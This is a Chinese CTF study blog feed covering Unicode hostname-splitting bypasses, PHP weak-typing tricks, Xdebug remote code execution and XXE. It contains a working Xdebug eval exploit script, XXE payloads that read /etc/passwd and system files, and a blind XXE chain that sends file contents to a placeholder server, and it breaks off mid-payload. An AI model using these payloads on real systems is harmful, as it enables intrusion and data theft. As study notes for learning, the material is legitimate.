        <content type="html"><![CDATA[<p>🐱黑帽大会议题</p><a id="more"></a><p>8/22/2019 11:39:23 AM </p><h1 id="HostSplit-Exploitable-Antipatterns-In-Unicode-Normalization-学习"><a href="#HostSplit-Exploitable-Antipatterns-In-Unicode-Normalization-学习" class="headerlink" title="HostSplit-Exploitable-Antipatterns-In-Unicode-Normalization 学习"></a>HostSplit-Exploitable-Antipatterns-In-Unicode-Normalization 学习</h1><h2 id="IDN-与-UTF-8"><a href="#IDN-与-UTF-8" class="headerlink" title="IDN 与 UTF-8"></a>IDN 与 UTF-8</h2><p><strong>IDN</strong></p><blockquote><p>国际化域名IDNs (Internationalized Domain Names)也称多语种域名，是指非英语国家为推广本国语言的域名系统的一个总称，例如含有日文的为日文域名，含有中文的域名为中文域名。<br>科研人员又将纯数字表示的IP地址基础上推出更加便于记忆的字符型访问标识，即基于IP地址的域名系统。这些域名只能使用63个ASCII字符（”a-z”，”A-Z”，”0-9”，”-“）. 随着互联网在非英语国家的迅猛发展，九十年代末期国际互联网界提出了将原本只能使用63个ASCII字符的域名，采用本地语言文字来表示，也就是出现了对多语种域名的需求。</p></blockquote><p><a href="http://中国政府.政务/" target="_blank" rel="noopener">http://中国政府.政务/</a></p><p>这是我国的政府网站！</p><p><strong>UTF-8</strong></p><blockquote><p>UTF-8（8-bit Unicode Transformation Format）是一种针对Unicode的可变长度字符编码，由Ken Thompson于1992年创建，现在已经标准化为RFC 3629。UTF-8用1到4个字节编码Unicode字符。用在网页上可以统一页面显示中文简体繁体及其它语言.</p></blockquote><p>Puny 编码 (Punycode)</p><blockquote><p>这是一个简易而准确的IDN ASCII 编码系统 (ASCII-Compatible Encoding (ACE))。它能转换一系列的 字符编码成为字符以符合主机名称(hostname)标准 (ASCII 字母，数位和连字符号)。<br>例: xn–0zwm56d.test </p></blockquote><pre><code>中国.政府-&gt;xn--fiqs8s.xn--mxtq1m</code></pre><h2 id="Unicode-➔-ASCII-–-A-Two-Step-Process"><a href="#Unicode-➔-ASCII-–-A-Two-Step-Process" class="headerlink" title="Unicode ➔ ASCII – A Two Step Process"></a>Unicode ➔ ASCII – A Two Step Process</h2><ol><li>Normalization Convert characters to a “standardized form”.</li><li>Punycoding Turn Unicode into ASCII.</li></ol><p>意思就是说IDN的使用底层还是ASCII的功劳。先转换成标准形式然后进行puny编码。</p><p><img src="http://wx2.sinaimg.cn/mw690/006boCb9ly1g68vpab2bbj30qn08tq3k.jpg" alt="转换过程"></p><h2 id="Splitting-Hostnames"><a href="#Splitting-Hostnames" class="headerlink" title="Splitting Hostnames"></a>Splitting Hostnames</h2><pre><code>https://evil.c℀.Example.com</code></pre><p>我们对他进行转换成ASCII会发生什么？</p><p><img src="http://wx4.sinaimg.cn/mw690/006boCb9ly1g68vpd5xcfj30pa09pq3k.jpg" alt="Normalizing "></p><pre><code>https://evil.ca/c.Example.com</code></pre><p><strong>No need to Punycode anything – it’s all ASCII now!</strong>也就是不用再次编码已经可以解析了</p><h2 id="python-utf-8-unicode-ascii互转"><a href="#python-utf-8-unicode-ascii互转" class="headerlink" title="python utf-8,unicode,ascii互转"></a>python utf-8,unicode,ascii互转</h2><p>unicode-&gt;ascii</p><pre><code>&gt;&gt;&gt; ord(u&apos;脑&apos;)33041</code></pre><p>ascii-&gt;unicode</p><pre><code>&gt;&gt;&gt; chr(33041)&apos;脑</code></pre><p>unicode &lt;=&gt; utf-8</p><pre><code>&gt;&gt;&gt; n = u.encode(&apos;utf8&apos;)&gt;&gt;&gt; nb&apos;\xe5\xb1\x8c&apos;&gt;&gt;&gt; m = n.decode(&apos;utf8&apos;)</code></pre><p>注：linux默认编码为unicode，若为其他两种编码进行转换，需unicode作为“媒介</p><h2 id="Python-was-vulnerable"><a href="#Python-was-vulnerable" class="headerlink" title="Python was vulnerable"></a>Python was vulnerable</h2><pre><code>&gt;&gt;&gt; from urllib.parse import urlsplit, urlunsplit &gt;&gt;&gt; url = &apos;http://canada.c℀.microsoft.com/some.txt&apos; &gt;&gt;&gt; parts = list(urlsplit(url)) &gt;&gt;&gt; host = parts[1] &gt;&gt;&gt; host &apos;canada.c℀.microsoft.com&apos; &gt;&gt;&gt; newhost = [] &gt;&gt;&gt; for h in host.split(&apos;.&apos;): ... newhost.append(h.encode(&apos;idna&apos;).decode(&apos;utf-8&apos;)) ... &gt;&gt;&gt; parts[1] = &apos;.&apos;.join(newhost) &gt;&gt;&gt; finalUrl = urlunsplit(parts) &gt;&gt;&gt; finalUrl &apos;http://canada.ca/c.microsoft.com/some.txt&apos; </code></pre><h2 id="Python-had-an-extra-variant"><a href="#Python-had-an-extra-variant" class="headerlink" title="Python had an extra variant"></a>Python had an extra variant</h2><pre><code>&gt;&gt;&gt; from urllib.parse import urlparse &gt;&gt;&gt; r=&apos;http://bing.com&apos;+u&apos;\uFF03&apos;+&apos;:password@products.office.com&apos; &gt;&gt;&gt; o = urlparse(r) &gt;&gt;&gt; o.hostname &apos;products.office.com&apos; &gt;&gt;&gt; a = r.encode(&quot;IDNA&quot;).decode(&quot;ASCII&quot;) &gt;&gt;&gt; a &apos;http://bing.com#:password@products.office.com&apos; &gt;&gt;&gt; o = urlparse(a) &gt;&gt;&gt; o.hostname &apos;bing.com&apos;</code></pre><h2 id="SUCTF-PythonNginx"><a href="#SUCTF-PythonNginx" class="headerlink" title="SUCTF PythonNginx"></a>SUCTF PythonNginx</h2><p>SUCTF中的一道题：</p><pre><code>    @app.route(&apos;/getUrl&apos;, methods=[&apos;GET&apos;, &apos;POST&apos;])def getUrl():    url = request.args.get(&quot;url&quot;)    host = parse.urlparse(url).hostname    if host == &apos;suctf.cc&apos;:        return &quot;我扌 your problem? 111&quot;    parts = list(urlsplit(url))    host = parts[1]    if host == &apos;suctf.cc&apos;:        return &quot;我扌 your problem? 222 &quot; + host    newhost = []    for h in host.split(&apos;.&apos;):        newhost.append(h.encode(&apos;idna&apos;).decode(&apos;utf-8&apos;))    parts[1] = &apos;.&apos;.join(newhost)    #去掉 url 中的空格    finalUrl = urlunsplit(parts).split(&apos; &apos;)[0]    host = parse.urlparse(finalUrl).hostname    if host == &apos;suctf.cc&apos;:        return urllib.request.urlopen(finalUrl).read()    else:        return &quot;我扌 your problem? 333&quot;</code></pre><p>爆破最后一位c</p><pre><code>from urllib.parse import urlparse,urlunsplit,urlsplitfrom urllib import parsedef get_unicode():    for x in range(65536):        uni=chr(x)        url=&quot;http://suctf.c{}&quot;.format(uni)        try:            if getUrl(url):                print(&apos;11&apos;)                print(&quot;str: &quot;+uni+&apos; unicode: \\u&apos;+str(hex(x))[2:])        except:            passdef getUrl(url):    url = url    host = parse.urlparse(url).hostname    if host == &apos;suctf.cc&apos;:        return False    parts = list(urlsplit(url))    host = parts[1]    if host == &apos;suctf.cc&apos;:        return False    newhost = []    for h in host.split(&apos;.&apos;):        newhost.append(h.encode(&apos;idna&apos;).decode(&apos;utf-8&apos;))    parts[1] = &apos;.&apos;.join(newhost)    finalUrl = urlunsplit(parts).split(&apos; &apos;)[0]    host = parse.urlparse(finalUrl).hostname    if host == &apos;suctf.cc&apos;:        return True    else:        return Falseif __name__==&quot;__main__&quot;:    get_unicode()str: �G unicode: \u2105str: �� unicode: \uff23str: �� unicode: \uff43[Finished in 6.5s]</code></pre><p>我们看一下各个判断的结果</p><pre><code>from urllib.parse import urlparse,urlunsplit,urlsplitfrom urllib import parseurl = &apos;http://canada.c℀.microsoft.com/some.txt&apos;parts = parse.urlparse(url)&gt;&gt;&gt; partsParseResult(scheme=&apos;http&apos;, netloc=&apos;canada.c℀.microsoft.com&apos;, path=&apos;/some.txt&apos;, params=&apos;&apos;, query=&apos;&apos;, fragment=&apos;&apos;)&gt;&gt;&gt; host = parts.hostname&gt;&gt;&gt; host&apos;canada.c℀.microsoft.com&apos;&gt;&gt;&gt; parts1 = list(urlsplit(url))&gt;&gt;&gt; parts1[&apos;http&apos;, &apos;canada.c℀.microsoft.com&apos;, &apos;/some.txt&apos;, &apos;&apos;, &apos;&apos;]</code></pre><p>可以看到已经可以绕过判断了</p><h3 id="hosts文件"><a href="#hosts文件" class="headerlink" title="hosts文件"></a>hosts文件</h3><p>Hosts是一个没有扩展名的系统文件，可以用记事本等工具打开，其作用就是将一些常用的网址域名与其对应的IP地址建立一个关联“数据库”，当用户在浏览器中输入一个需要登录的网址时，系统会首先自动从Hosts文件中寻找对应的IP地址，一旦找到，系统会立即打开对应网页，如果没有找到，则系统再会将网址提交DNS域名解析服务器进行IP地址的解析。</p><h3 id="file协议"><a href="#file协议" class="headerlink" title="file协议"></a>file协议</h3><p>中文意思：本地文件传输协议<br>什么是File：File协议主要用于访问本地计算机中的文件，就如同在Windows资源管理器中打开文件一样。<br>如何使用File：要使用File协议，基本的格式如下：file:///文件路径，比如要打开F盘flash文件夹中的1.swf文件，那么可以在资源管理器或浏览器地址栏中输入：file:///f:/flash/1.swf回车。</p><h3 id="nginx配置"><a href="#nginx配置" class="headerlink" title="nginx配置"></a>nginx配置</h3><p> Nginx的配置文件是一个纯文本文件，它一般位于Nginx安装目录的conf目录下，整个配置文件是以block的形式组织的。每个block一般以一个大括号“{”来表示。block 可以分为几个层次，整个配置文件中Main命令位于最高层，在Main层下面可以有Events、 HTTP等层级，而在HTTP层中又包含Server层，即server block, serverblock中又可分为location层，并且一个server block中可以包含多个location block。</p><p>nginx配置文件路径</p><pre><code>[root@localhost vhost]# locate nginx.conf/usr/local/nginx/conf/nginx.conf/usr/local/nginx/conf/nginx.conf.default</code></pre><p>hosts文件绑定本地回环地址，尝试file读文件</p><p><img src="http://wx1.sinaimg.cn/mw690/006boCb9ly1g68vpgbsavj30qj0dq765.jpg" alt="尝试读文件"></p><p>读nginx配置文件</p><p><img src="http://wx3.sinaimg.cn/mw690/006boCb9ly1g68vpjpmkej30oy0cgdh1.jpg" alt="读配置文件"></p><p>读flag</p><p><img src="http://wx4.sinaimg.cn/mw690/006boCb9ly1g68vpmmt76j30ok070dgl.jpg" alt="读flag"></p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>black_magic</title>
      <link href="/2019/08/19/Black-magic/"/>
      <url>/2019/08/19/Black-magic/</url>
      
        <content type="html"><![CDATA[<p>别说了，听我的！php is the best language!我不允许你有别的想法！ </p><p>我要我觉得！不要你觉得！</p><a id="more"></a><h1 id="php-弱类型总结"><a href="#php-弱类型总结" class="headerlink" title="php 弱类型总结"></a>php 弱类型总结</h1><h2 id="字符与数字的比较"><a href="#字符与数字的比较" class="headerlink" title="字符与数字的比较"></a>字符与数字的比较</h2><pre><code>&lt;?php$a=1;if($a=TRUE)    echo &quot;1111\n&quot;;if($a=&apos;a&apos;)    echo &quot;1111\n&quot;;结果11111111</code></pre><p>联想到之前P神的文章，<code>TRUE+TRUE=2</code></p><pre><code>$_=(&apos;&gt;&apos;&gt;&apos;&lt;&apos;)+(&apos;&gt;&apos;&gt;&apos;&lt;&apos;);        //2echo $_;$__=$_/$_;                    //1</code></pre><p>来构造数字1和2</p><h2 id="md5比较"><a href="#md5比较" class="headerlink" title="md5比较"></a>md5比较</h2><pre><code>&lt;?phperror_reporting(0); $flag = &apos;233&apos;;//highlight_file(__FILE__);  $md51 = md5(&apos;QNKCDZO&apos;);  //0e830400451993494058024219903391//$a = $_GET[&apos;b&apos;]; $a = &apos;s878926199a&apos;;$md52 = md5($a); if(isset($a)){ if ($a != &apos;QNKCDZO&apos; &amp;&amp; $md51 == $md52) {     echo $flag; } else {     echo &quot;false!!!&quot;;     }}</code></pre><p>php在进行 <code>==</code> 比较的时候会认为该字符串是科学记数法表示的数字，<code>QNKCDZO</code> MD5值是<code>0e</code>开头，我们也找到一个MD5后<code>0e</code>开头的这样两个字符串都转换为数字0，这样就弱比较相等，但是如果是 <code>===</code> 就不行了。</p><p> === 在进行比较的时候会判断两种字符串的类型是否相等再比较。</p><p> == 在进行比较的时候会将字符串类型转换相同，再比较。如果比较一个数字和字符串或者涉及到数字内容的字符串，则字符串会被转换成数值并且比较按照数值来进行。</p><pre><code>var_dump(&apos;admin&apos;==0);var_dump(&apos;1admin&apos;==1);var_dump(&quot;admin1&quot;==1);var_dump(&quot;admin1&quot;==0);var_dump(&quot;0e123345&quot;==&quot;0e3455436&quot;);bool(true)bool(true)bool(false)bool(true)bool(true)</code></pre><p>例如<br>        <?php        $a=$_GET['a'];        if ($a==0) {        echo "1";        }        if ($a) {        echo "must";        }        ?></p><p>我们传入<code>?a=a1</code>即可</p><p>一些MD5后0e开头的例子</p><pre><code>s878926199a0e545993274517709034328855841020s155964671a0e342768416822451524974117254469s214587387a0e848240448830537924465865611904s214587387a0e848240448830537924465865611904</code></pre><p>json-decode</p><pre><code>&lt;?phpif (isset($_POST[&apos;message&apos;])) {    $message = json_decode($_POST[&apos;message&apos;]);    $key =&quot;*********&quot;;    if ($message-&gt;key == $key) {        echo &quot;flag&quot;;        }     else {        echo &quot;fail&quot;;        }     }     else{         echo &quot;~~~~&quot;; }</code></pre><p>我们利用 0 = admin 的特性传入 <code>$message = {&quot;key&quot;:0}</code></p><h2 id="当MD5与SHA1碰上数组"><a href="#当MD5与SHA1碰上数组" class="headerlink" title="当MD5与SHA1碰上数组"></a>当MD5与SHA1碰上数组</h2><pre><code>$a = [1];var_dump(MD5($a));var_dump(sha1($a));NULLNULL</code></pre><p>他俩碰到数组就会转换成<code>NULL</code></p><h2 id="intval"><a href="#intval" class="headerlink" title="intval()"></a>intval()</h2><pre><code>&lt;?php var_dump(intval(&apos;2&apos;));            //2var_dump(intval(&apos;3abcd&apos;));        //3    var_dump(intval(&apos;abcd&apos;));        //0var_dump(intval([]));            //0    var_dump(intval([&apos;a&apos;]));        //1 ?&gt;</code></pre><p>利用intval()进行进制转换(默认是10进制)碰到头开始直到遇到一个非数字的字符。即使出现无法转换的字符串也不会报错而是返回0.碰到空数组返回0，非空返回1.</p><p>可返回的最大值却决于操作系统，32 位系统最大带符号的 <code>integer</code> 范围是 <code>-2147483648</code> 到 <code>2147483647</code>。</p><pre><code>var_dump(intval(&apos;10000000000000000&apos;));   //int(2147483647)</code></pre><h2 id="strcmp"><a href="#strcmp" class="headerlink" title="strcmp"></a>strcmp</h2><blockquote><p>strcmp — 二进制安全字符串比较<br>如果 str1 小于 str2 返回 &lt; 0；如果 str1 大于 str2 返回 &gt; 0；如果两者相等，返回 0。</p></blockquote><pre><code>$password=$_GET[&apos;password&apos;];if(strcmp(&apos;am0s&apos;,$password)){    echo &apos;false!&apos;;}else{    echo &apos;success!&apos;;}</code></pre><p>我们传入<code>password[]=1</code>来绕过。</p><h2 id="is-numeric"><a href="#is-numeric" class="headerlink" title="is_numeric"></a>is_numeric</h2><p>当有两个<code>is_numeric</code>判断并用<code>and</code>连接时<code>and</code>后面的<code>is_numeric</code>可以绕过</p><blockquote><p>is_numeric — 检测变量是否为数字或数字字符串<br>如果 var 是数字和数字字符串则返回 TRUE，否则返回 FALSE</p></blockquote><pre><code>var_dump(is_numeric(&apos; 45&apos;));   //bool(true)var_dump(is_numeric(&apos;45 &apos;));   //bool(false)</code></pre><p>忽略前面的空格，不忽略后面的空格。</p><pre><code>$a=&apos; 1&apos;;$b=&apos;abc&apos;;$c=is_numeric($a) and is_numeric($b);var_dump(is_numeric($a));            //bool(true)var_dump(is_numeric($b));            //bool(false)var_dump($c);  //$b可以不是数字，同样返回truevar_dump(is_numeric(&apos;123E123&apos;));    //bool(true) 小写也可以var_dump(is_numeric(&apos;+123e123&apos;));    //bool(true)    </code></pre><h2 id="与false比较"><a href="#与false比较" class="headerlink" title="与false比较"></a>与false比较</h2><pre><code>var_dump(null==false);        //bool(true)var_dump(0==false);            //bool(true)    var_dump(&apos;0&apos;==false);        //bool(true)$a[] = array(&apos; &apos; =&gt; &apos;&apos;,);var_dump($a[1] == false);        //bool(true)?&gt;</code></pre><h2 id="ereg"><a href="#ereg" class="headerlink" title="ereg"></a>ereg</h2><blockquote><p>ereg — 正则表达式匹配<br>以区分大小写的方式在 string 中寻找与给定的正则表达式 pattern 所匹配的子串。 如果找到与 pattern 中圆括号内的子模式相匹配的子串并且函数调用给出了第三个参数 regs，则匹配项将被存入 regs 数组中。$regs[1] 包含第一个左圆括号开始的子串，$regs[2] 包含第二个子串，以此类推。$regs[0] 包含整个匹配的字符串。 </p></blockquote><p>字符串对比解析，ereg函数存在NULL截断漏洞，当ereg读取字符串string时,如果遇到了%00,后面的字符串就不会被解析。</p><pre><code>$a = &quot;djasodja%0091&quot;;$b[] =  array(&apos;a&apos; =&gt; &apos;abcpd&apos;, );var_dump(ereg(&apos;([1-9])&apos;, $a));            //int(1)var_dump(ereg(&apos;pd&apos;, $b));                //NULL</code></pre><h2 id="switch"><a href="#switch" class="headerlink" title="switch"></a>switch</h2><blockquote><p>switch 语句类似于具有同一个表达式的一系列 if 语句。很多场合下需要把同一个变量（或表达式）与很多不同的值比较，并根据它等于哪个值来执行不同的代码。这正是 switch 语句的<br>用途.<br> 注意和其它语言不同，continue 语句作用到 switch 上的作用类似于 break。如果在循环中有一个 switch 并希望 continue 到外层循环中的下一轮循环，用 continue 2。<br> switch 语句一行接一行地执行（实际上是语句接语句）。开始时没有代码被执行。仅当一个 case 语句中的值和 switch 表达式的值匹配时 PHP 才开始执行语句，直到 switch 的程序段结束或者遇到第一个 break 语句为止。如果不在 case 的语句段最后写上 break 的话，PHP 将继续执行下一个 case 中的语句段.</p></blockquote><pre><code>&lt;?phpswitch (true) {    //弱类型    case 0:        echo &quot;0&quot;;        break;    case 1:        echo &quot;1&quot;;        break;    case 2:        echo &quot;2&quot;;        break;}//1?&gt;&lt;?phpswitch (0) {    case 0:        echo &quot;i equals 0&quot;;    case 1:        echo &quot;i equals 1&quot;;    case 2:        echo &quot;i equals 2&quot;;}//i equals 0    i equals 1    i equals 2?&gt; &lt;?phpswitch (&apos;a&apos;) {  // null、false    case 0:        echo &quot;0&quot;;        break;    case 1:        echo &quot;1&quot;;        break;    case 2:        echo &quot;2&quot;;        break;}//输出 0?&gt;</code></pre><h2 id="strpos"><a href="#strpos" class="headerlink" title="strpos"></a>strpos</h2><blockquote><p>strpos — 查找字符串首次出现的位置</p><p>int strpos( string $haystack, mixed $needle[, int $offset = 0] )<br>返回 needle 在 haystack 中首次出现的数字位置。</p><p>haystack<br>在该字符串中进行查找。 </p><p>needle<br>如果 needle 不是一个字符串，那么它将被转换为整型并被视为字符的顺序值。 </p><p>offset<br>如果提供了此参数，搜索会从字符串该字符数的起始位置开始统计。如果是负数，搜索会从字符串结尾指定字符数开始。<br>返回 needle 存在于 haystack 字符串起始的位置(独立于 offset)。同时注意字符串位置是从0开始，而不是从1开始的。<br>如果没找到 needle，将返回 FALSE。 </p><p>7.1.0 开始支持负数的 offset。  </p></blockquote><p>处理数组返回NULL</p><h2 id="array-search"><a href="#array-search" class="headerlink" title="array_search"></a>array_search</h2><blockquote><p>array_search — 在数组中搜索给定的值，如果成功则返回首个相应的键名</p><p>mixed array_search( mixed $needle, array $haystack[, bool $strict = false] )</p><p>大海捞针，在大海（haystack）中搜索针（ needle 参数）。</p><p>needle<br>搜索的值。<br>Note:<br>如果 needle 是字符串，则比较以区分大小写的方式进行。</p><p>haystack<br>这个数组。 </p><p>strict<br>如果可选的第三个参数 strict 为 TRUE，则 array_search() 将在 haystack 中检查完全相同的元素。这意味着同样严格比较 haystack 里 needle 的 类型，并且对象需是同一个实例。<br>如果找到了 needle 则返回它的键，否则返回 FALSE。 </p><p>如果 needle 在 haystack 中出现不止一次，则返回第一个匹配的键。要返回所有匹配值的键，应该用 array_keys() 加上可选参数 search_value 来代替。</p></blockquote><pre><code>&lt;?phpif(!is_array($_GET[&apos;test&apos;])){exit();}$test=$_GET[&apos;test&apos;];for($i=0;$i&lt;count($test);$i++){    if($test[$i]===&quot;admin&quot;){        echo &quot;error&quot;;        exit();    }    $test[$i]=intval($test[$i]);}if(array_search(&quot;admin&quot;,$test)===0){    echo &quot;flag&quot;;}else{    echo &quot;false&quot;;}?&gt;</code></pre><p>我们使用<code>test[]=0</code>来绕过。如果第三个参数设置为<code>TRUE</code>，进行严格过滤就不能绕过。</p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> php </tag>
            
            <tag> 弱类型 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Xdebug</title>
      <link href="/2019/08/17/Xdebug/"/>
      <url>/2019/08/17/Xdebug/</url>
      
        <content type="html"><![CDATA[<p>你从未见过的船新知识点</p><a id="more"></a><h1 id="Xdebug"><a href="#Xdebug" class="headerlink" title="Xdebug"></a>Xdebug</h1><p>如何确定开启动态调试？</p><p>在vps上监听9000端口  <code>nc -l -vv -p 9000</code></p><p>再打开一个窗口执行 <code>curl &#39;http://TARGET_IP/index.php?XDEBUG_SESSION_START=phpstrom&#39; -H &quot;X-Forwarded-For: VPS_IP&quot;</code></p><p>如果此时监听窗口收到返回的xml数据则证明开启了动态调试。</p><h2 id="如何利用"><a href="#如何利用" class="headerlink" title="如何利用?"></a>如何利用?</h2><p>Ricterz师傅写好了exp:</p><pre><code>#!/usr/bin/python2import socketip_port = (&apos;0.0.0.0&apos;,9000)sk = socket.socket()sk.bind(ip_port)sk.listen(10)conn, addr = sk.accept()while True:    client_data = conn.recv(1024)    print(client_data)    data = raw_input(&apos;&gt;&gt; &apos;)    conn.sendall(&apos;eval -i 1 -- %s\x00&apos; % data.encode(&apos;base64&apos;))</code></pre><p>在vps上执行脚本，然后执行上文的curl代码触发Xdebug即可任意命令执行</p><p>我们首先<code>system(&#39;find /|grep flag&#39;)</code> 找一下flag在哪，然后读取</p><pre><code>system(&apos;cat /home/flag.txt&apos;)</code></pre><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><blockquote><p><a href="http://0sec.com.cn/2018-05-10/" target="_blank" rel="noopener">http://0sec.com.cn/2018-05-10/</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Xdebuf </tag>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>xxe</title>
      <link href="/2019/08/17/xxe/"/>
      <url>/2019/08/17/xxe/</url>
      
        <content type="html"><![CDATA[<p>一次简单的xxe学习~</p><a id="more"></a><h1 id="XXE"><a href="#XXE" class="headerlink" title="XXE"></a>XXE</h1><h2 id="定义实体"><a href="#定义实体" class="headerlink" title="定义实体"></a>定义实体</h2><pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;&lt;!DOCTYPE foo [&lt;!ELEMENT foo ANY &gt;&lt;!ENTITY xxe &quot;test&quot; &gt;]&gt;</code></pre><p>定义ANY说明接受任何元素，定义了了一个XML实体xxe，我们可以通过&amp;进行引用。XML可以写成这样，我们输出的结果中xxe被替换成了test</p><pre><code>&lt;creds&gt;&lt;user&gt;&amp;xxe;&lt;/user&gt;&lt;pass&gt;mypass&lt;/pass&gt;&lt;/creds&gt;</code></pre><h2 id="实体引用"><a href="#实体引用" class="headerlink" title="实体引用"></a>实体引用</h2><pre><code>&amp;lt;    &lt;    小于号&amp;gt;    &gt;    大于号&amp;amp;    &amp;    和号&amp;apos;    &apos;    单引号&amp;quot;    &quot;    引号 </code></pre><h2 id="DTD-document-type-definition-文档类型定义"><a href="#DTD-document-type-definition-文档类型定义" class="headerlink" title="DTD(document type definition 文档类型定义)"></a>DTD(document type definition 文档类型定义)</h2><p>自定义XML文档的合法构建模块，可以在XML内部声明也可以外部引用。</p><p><code>SYSTEM</code> 外部引用文件<br>    <!DOCTYPE note SYSTEM "XXX.XX"></p><p>内部实体声明</p><pre><code>&lt;!ENTITY entity-name &quot;entity-value&quot;&gt;&lt;?xml version=&apos;1.0&apos;?&gt;&lt;!DOCTYPE mail[&lt;!ELEMENT mail (message)&gt;&lt;!ENTITY hacker &quot;hacker&apos;s data&quot;&gt;]&gt;&lt;mail&gt;    &lt;message&gt;&amp;hacker;&lt;/message&gt;&lt;/mail&gt;</code></pre><p>外部实体声明</p><pre><code>&lt;?xml version=&apos;1.0&apos;?&gt;&lt;!DOCTYPE mail[&lt;!ELEMENT mail (message)&gt;&lt;!--ENTITY hacker &quot;hacker&apos;s data&quot;--&gt;&lt;!ENTITY hacker SYSTEM &quot;file:///C:/Windows/win.ini&quot;&gt;]&gt;&lt;mail&gt;    &lt;message&gt;&amp;hacker;&lt;/message&gt;&lt;/mail&gt;</code></pre><p>当然我们也可以引用公用DTD，语法如下</p><pre><code>&lt;!DOCTYPE 根元素名称 PUBLIC “DTD标识名” “公用DTD的URI”&gt;</code></pre><p>起和SYSTEM一样的作用</p><h2 id="外部声明默认协议"><a href="#外部声明默认协议" class="headerlink" title="外部声明默认协议"></a>外部声明默认协议</h2><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20181120002647-e93bbf00-ec17-1.png" alt></p><h2 id="通用实体与参数实体"><a href="#通用实体与参数实体" class="headerlink" title="通用实体与参数实体"></a>通用实体与参数实体</h2><p>只能用在DTD和文档的内部子集中</p><p><strong>通用实体</strong> <code>&amp;name;</code> 在DTD中定义，在XML中引用，如上文的示例代码。</p><p><strong>参数实体</strong></p><ol><li>使用 <code>% name</code> 在DTD中定义，并且只能在DTD中使用<code>%name</code>引用</li><li>只有在DTD文件中，参数实体的声明才能引用其他实体</li><li>参数实体也可以外部引用。</li></ol><h2 id="有回显读本地敏感文件"><a href="#有回显读本地敏感文件" class="headerlink" title="有回显读本地敏感文件"></a>有回显读本地敏感文件</h2><p>本地服务器解析代码</p><pre><code>&lt;?php    libxml_disable_entity_loader (false);    $xmlfile = file_get_contents(&apos;php://input&apos;);    $dom = new DOMDocument();    $dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);     $creds = simplexml_import_dom($dom);    echo $creds;?&gt;</code></pre><p>payload</p><pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; &lt;!DOCTYPE creds [  &lt;!ENTITY goodies SYSTEM &quot;file:///c:/windows/system.ini&quot;&gt; ]&gt; &lt;creds&gt;&amp;goodies;&lt;/creds&gt;</code></pre><p>成功读取到敏感文件，但是如果我们的目标文件包含特殊符号时XML解释器会生成错误，我们这样做就会报错，此时我们就使用 <code>&lt;![CDATA[</code>在参数实体中进行。</p><p>payload</p><pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; &lt;!DOCTYPE roottag [&lt;!ENTITY % start &quot;&lt;![CDATA[&quot;&gt;   &lt;!ENTITY % goodies SYSTEM &quot;file:///d:/test.txt&quot;&gt;  &lt;!ENTITY % end &quot;]]&gt;&quot;&gt;  &lt;!ENTITY % dtd SYSTEM &quot;http://ip/evil.dtd&quot;&gt; %dtd; ]&gt; &lt;roottag&gt;&amp;all;&lt;/roottag&gt;</code></pre><p>evil.dtd</p><pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt; &lt;!ENTITY all &quot;%start;%goodies;%end;&quot;&gt;</code></pre><p>also,we can read the file just bs64-encode</p><pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;     &lt;!DOCTYPE creds [      &lt;!ENTITY goodies SYSTEM &quot;php://filter/read=convert.base64-encode/resource=file:///D:/test.txt&quot;&gt; ]&gt;     &lt;creds&gt;&amp;goodies;&lt;/creds&gt;</code></pre><p>这样就算有特殊字符也不怕啦！</p><h2 id="无回显读取本地敏感文件-Blind-OOB-XXE"><a href="#无回显读取本地敏感文件-Blind-OOB-XXE" class="headerlink" title="无回显读取本地敏感文件(Blind OOB XXE)"></a>无回显读取本地敏感文件(Blind OOB XXE)</h2><p>外部实体可以通过请求内部文件uri获得文件内容，那我们可以通过写两个外部参数实体来请求自己的服务器将文件内容发送到我们的服务器上</p><pre><code>&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE message [    &lt;!ENTITY % files SYSTEM &quot;file:///etc/passwd&quot;&gt;      &lt;!ENTITY % send SYSTEM &quot;http://myip/?a=%files;&quot;&gt;     %send;]&gt;</code></pre><p>但是这样是不行的，几乎所有的XML解析器都不会解析同级参数实体的内容。</p><p>如果我们进行嵌套操作呢？</p><pre><code>&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE message [    &lt;!ENTITY % file SYSTEM &quot;file:///etc/passwd&quot;&gt;      &lt;!ENTITY % start &quot;&lt;!ENTITY &amp;#x25; send SYSTEM &apos;http://myip/?%file;&apos;&gt;&quot;&gt;    %start;    %send;]&gt;</code></pre><p>会报错 <code>PEReferences forbidden in internal subset in Entity</code>。禁止在内部实体引用参数实体。基于此我们采用引入外部DTD，在自己的服务器上加入DTD文件</p><p>xml.php</p><pre><code>&lt;?phplibxml_disable_entity_loader (false);$xmlfile = file_get_contents(&apos;php://input&apos;);$dom = new DOMDocument();$dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD); //loadXML() 方法通过解析一个 XML 标签字符串来组成该文档。?&gt;</code></pre><p>test.dtd</p><pre><code>&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=file:///D:/test.txt&quot;&gt;&lt;!ENTITY % int &quot;&lt;!ENTITY &amp;#37 send SYSTEM &apos;http://ip:9999?p=%file;&apos;&gt;&quot;&gt;</code></pre><p>payload</p><pre><code>&lt;!DOCTYPE convert [ &lt;!ENTITY % remote SYSTEM 